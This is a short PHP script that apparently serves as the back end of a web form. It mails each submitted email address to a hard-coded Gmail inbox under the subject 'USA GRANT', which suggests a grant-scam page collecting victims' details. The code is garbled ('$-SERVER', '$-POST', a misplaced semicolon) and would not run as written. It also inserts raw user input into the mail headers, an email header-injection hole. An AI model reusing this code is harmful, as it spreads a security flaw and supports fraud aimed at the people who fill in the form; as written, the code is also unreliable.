<?php
if($-SERVER['REQUEST-METHOD'] === 'POST')
{
    $email = $-POST['email'];
    $to = 'josephgodshand13@gmail.com';

    $subject = 'USA GRANT';
    $message = "You recieved  message from: $email;"

    $headers = " From: $email". "\r\n".
    'Reply-To:'. $email. "\r\n". 
    'X-Mailer:PHP/'. 
    phpversion();

    if (mail($to, $subject, $message, $headers)){
        echo 'Email sent Successfully!';
    }
    else{
        echo 'Failed to send email.';
    }
    }
    